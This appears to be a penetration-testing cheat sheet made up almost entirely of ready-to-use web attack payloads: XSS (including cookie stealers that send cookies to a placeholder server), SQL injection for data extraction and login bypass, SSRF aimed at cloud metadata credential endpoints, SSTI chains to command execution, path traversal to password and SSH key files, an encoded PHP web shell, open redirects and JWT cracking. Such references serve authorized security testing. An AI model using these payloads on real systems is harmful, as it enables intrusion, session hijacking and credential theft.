# 💉 Vulnerability Payloads Cheat Sheet

## XSS Payloads

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Attribute injection -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- Tag injection -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- JavaScript URI -->
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>

<!-- WAF Bypass -->
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
\u003cscript\u003ealert(1)\u003c/script\u003e
<svg><script>alert&#40;1&#41;</script>

<!-- Cookie Stealer -->
<script>document.location='https://your-server.com/?c='+document.cookie</script>
<script>fetch('https://your-server.com/?c='+btoa(document.cookie))</script>

<!-- DOM XSS sources to check -->
document.URL
document.location
document.referrer
window.location.hash
window.location.search
```

---

## SQL Injection Payloads

```sql
-- Detection
'
''
`
')
1'
1"
1`
' OR '1'='1'--
1 AND 1=1
1 AND 1=2

-- Time-based blind
1' AND SLEEP(5)--                    MySQL
1'; WAITFOR DELAY '0:0:5'--          MSSQL
1' AND pg_sleep(5)--                 PostgreSQL
1' AND 1=(SELECT 1 FROM pg_sleep(5)) PostgreSQL

-- Error-based (MySQL)
1' AND extractvalue(1,concat(0x7e,database()))--
1' AND updatexml(1,concat(0x7e,version()),1)--

-- Union-based (find columns first)
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY 10--   (error = column count found)
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT NULL,NULL,NULL--

-- Data extraction
1 UNION SELECT table_name,NULL FROM information_schema.tables--
1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
1 UNION SELECT username,password FROM users--

-- File read (MySQL, if FILE privilege)
1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Authentication bypass
admin'--
admin'/*
' OR 1=1--
' OR 'x'='x
' OR 1=1#
admin' OR '1'='1'--
```

---

## SSRF Payloads

```
# Cloud Metadata (Critical!)
http://169.254.169.254/latest/meta-data/                    AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/  AWS IAM Keys!
http://169.254.169.254/latest/user-data/                    AWS User Data
http://metadata.google.internal/computeMetadata/v1/         GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  GCP Token!
http://169.254.169.254/metadata/v1/                         DigitalOcean
http://100.100.100.200/latest/meta-data/                    Alibaba Cloud

# Localhost bypass
http://localhost/admin
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://[::]/ 

# Protocol attacks
gopher://127.0.0.1:6379/_FLUSHALL         Redis RCE
gopher://127.0.0.1:25/HELO               SMTP

# Filter bypass
http://127.1/
http://2130706433/               (127.0.0.1 decimal)
http://0x7f000001/               (127.0.0.1 hex)
http://①②⑦.⓪.⓪.①/            (Unicode)

# DNS rebinding
http://your-domain-that-resolves-to-127.0.0.1/
```

---

## SSTI Payloads

```
# Detection (safe, just math)
{{7*7}}          → 49? = Jinja2/Twig
${7*7}           → 49? = FreeMarker/EL
#{7*7}           → 49? = Ruby/Smarty
*{7*7}           → 49? = Spring
<%= 7*7 %>       → 49? = ERB/EJS

# Jinja2 (Python)
{{config}}
{{config.items()}}
{{request.environ}}

# Jinja2 → RCE
{{''.__class__.__mro__[1].__subclasses__()}}
{%for c in [].__class__.__base__.__subclasses__()%}
{%if c.__name__=='catch_warnings'%}
{{c.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{%endif%}{%endfor%}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

---

## LFI Payloads

```
# Basic traversal
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....\/....\/....\/etc/passwd

# With null byte (older PHP)
../../../etc/passwd%00
../../../etc/passwd\0

# PHP wrappers
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://input    (+ POST body as PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Interesting files
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/www/html/.env
/var/log/apache2/access.log    (log poisoning)
/var/log/nginx/access.log
/home/user/.ssh/id_rsa
/home/user/.bash_history
/tmp/sess_SESSIONID             (PHP session files)

# Windows
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\xampp\apache\logs\access.log
C:\wamp\logs\apache_error.log
..\..\..\windows\win.ini
```

---

## IDOR Testing

```
# Numeric IDs
/api/order/1000          → try 1001, 999, 1
/api/user/101            → try 102, 1, 0, -1
/download?id=5           → try 1,2,3,4,6...

# UUIDs
/document/abc-123-def    → Need to find another user's UUID
                           (check other API responses)

# Encoded IDs
/api/item?id=MTAx        → base64 decode → 101 → try 102 → encode

# Tricks
?user_id=2 in body       → often overlooked
X-User-ID: 2 in header   → custom headers
"userId": "2" in JSON    → JSON body

# Vertical IDOR (privilege escalation)
Regular user accessing admin endpoint:
GET /api/admin/users
GET /admin/dashboard
POST /api/users/1/makeAdmin

# Common IDOR endpoints
/api/v1/users/{id}
/api/v1/orders/{id}
/api/v1/invoices/{id}
/api/v1/documents/{id}
/api/v1/payments/{id}
/api/v1/tickets/{id}
```

---

## Open Redirect Payloads

```
?redirect=https://evil.com
?next=//evil.com
?url=https:evil.com
?redirect=/\/evil.com
?return=@evil.com
?goto=\evil.com
?redirect=https://evil.com%23target.com
?redirect=https://target.com.evil.com
?redirect=https://evil%E3%80%82com      (unicode dot)

# OAuth redirect_uri
redirect_uri=https://evil.com
redirect_uri=https://target.com/../../../evil.com
redirect_uri=https://evil.com%40target.com
redirect_uri=https://target.com.evil.com
```

---

## JWT Attacks

```bash
# 1. Decode (base64)
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx" | \
  python3 -c "import sys,base64,json; parts=sys.stdin.read().split('.'); \
  print(json.dumps(json.loads(base64.b64decode(parts[0]+'==').decode()),indent=2)); \
  print(json.dumps(json.loads(base64.b64decode(parts[1]+'==').decode()),indent=2))"

# 2. Algorithm confusion (RS256 → HS256)
# Use public key as HMAC secret

# 3. None algorithm
header: {"alg":"none","typ":"JWT"}
# Remove signature

# 4. Weak secret brute-force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt

# Tools
jwt_tool -t https://target.com/api -rh "Authorization: Bearer TOKEN" -M at
```
